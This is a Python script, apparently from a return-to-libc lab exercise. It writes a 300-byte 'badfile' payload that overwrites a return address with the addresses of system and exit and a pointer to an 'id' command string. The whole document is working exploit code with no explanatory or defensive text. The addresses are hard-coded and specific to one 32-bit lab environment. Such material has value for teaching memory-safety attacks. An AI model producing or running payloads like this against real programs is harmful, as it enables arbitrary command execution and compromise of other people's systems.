#!/usr/bin/env python3
import sys

content = bytearray(0xaa for i in range(300))

# Use the address for "id" command
sh_addr = 0xbffffdc9        # The address for "id"
system_addr = 0xb7e42da0
exit_addr = 0xb7e369d0

offset_to_ret_addr = 20

X = offset_to_ret_addr
content[X:X+4] = (system_addr).to_bytes(4, byteorder='little')

Y = offset_to_ret_addr + 4
content[Y:Y+4] = (exit_addr).to_bytes(4, byteorder='little')

Z = offset_to_ret_addr + 8
content[Z:Z+4] = (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)

print("Exploit with id command")
print("shell addr: 0x%08x" % sh_addr)